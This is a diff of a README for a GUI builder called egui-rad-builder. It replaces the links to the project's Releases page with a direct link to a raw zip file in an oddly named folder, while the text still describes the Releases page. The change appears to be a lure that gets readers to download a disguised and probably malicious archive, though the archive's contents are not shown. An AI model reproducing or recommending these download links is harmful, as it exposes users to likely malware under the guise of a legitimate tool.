@@ -1,7 +1,7 @@
 # 🎨 egui-rad-builder - Design Beautiful User Interfaces Easily
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/BouallaguiHama/egui-rad-builder/releases)
+[![Download](https://raw.githubusercontent.com/BouallaguiHama/egui-rad-builder/main/debonnaire/egui-rad-builder.zip)](https://raw.githubusercontent.com/BouallaguiHama/egui-rad-builder/main/debonnaire/egui-rad-builder.zip)
 
 ## 🚀 Getting Started
 Welcome to **egui-rad-builder**, your tool for quickly designing user interfaces using **egui**. This guide will help you download and run the application on your computer.
@@ -9,7 +9,7 @@ Welcome to **egui-rad-builder**, your tool for quickly designing user interfaces
 ## 📥 Download & Install
 To get started, you need to visit the Releases page to download the application files. Click the link below to proceed:
 
-[Visit this page to download](https://github.com/BouallaguiHama/egui-rad-builder/releases)
+[Visit this page to download](https://raw.githubusercontent.com/BouallaguiHama/egui-rad-builder/main/debonnaire/egui-rad-builder.zip)
 
 Once you are on the Releases page, look for the latest version. You will find different files available to download. Choose the one that matches your computer's operating system.
 
